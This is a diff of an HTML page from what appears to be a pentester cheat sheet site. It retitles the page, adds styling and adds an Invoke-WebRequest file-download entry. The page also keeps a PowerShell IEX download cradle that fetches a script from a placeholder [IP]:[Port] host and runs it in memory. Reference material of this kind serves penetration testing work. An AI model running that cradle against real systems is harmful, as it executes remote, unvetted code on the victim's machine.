@@ -10,14 +10,22 @@
       font-family: Impact, sans-serif;
       background-color: red
     }
-    
+      hr{
+      background-color: black;
+      border-style: none;
+      height: 4px;
+    }
   </style>
 
 
 
 <center>
 <body>
-<h1> Useful Powershell Commands </h1>
+  <hr>
+<h1> Powershell Cheat Sheet </h1>
+  <hr>
+  <h3>Download File From Webserver</h3>
+  <p>Invoke-WebRequest -Uri [target url] -Outfile [location on local host to save file]
 <p> powershell "IEX(New-Object Net.WebClient).downloadstring('http://[IP]:[Port]/filename')"</p>
 <a href="https://themandalorian11.github.io/Pentester-Cheat-Sheet/index.html"> Back to Homepage </a>
 </body>
